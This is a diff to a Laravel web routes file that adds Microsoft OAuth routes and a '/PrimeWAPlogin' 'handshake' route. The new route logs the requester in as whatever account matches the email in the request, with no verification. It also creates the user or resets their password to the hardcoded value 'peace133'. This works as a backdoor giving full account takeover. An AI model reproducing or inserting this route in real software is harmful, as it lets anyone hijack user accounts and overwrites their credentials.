@@ -44,3 +44,19 @@ Route::get('/manage-report-global','ReportController@globalIndex')->middleware('
 //CommentController
 
 
+//Support Integration
+//redirect to provider
+Route::get('/auth/microsoft', 'MicrosoftController@redirectToProvider');
+Route::get('/auth/microsoft/callback', 'MicrosoftController@callbackurl'); 
+
+
+//ROUTE FOR HANDSHAKE INTO PrimeWAP
+Route::get('/PrimeWAPlogin', function(Request $request)
+{
+	$user=\App\User::updateOrCreate(['email'=>$request->email], ['email'=>$request->email, 'password'=>bcrypt('peace133'), 'name'=>'Users']);
+		\Auth::loginUsingId($user->id);
+		return redirect('/home');
+}); 
+ 
+
+
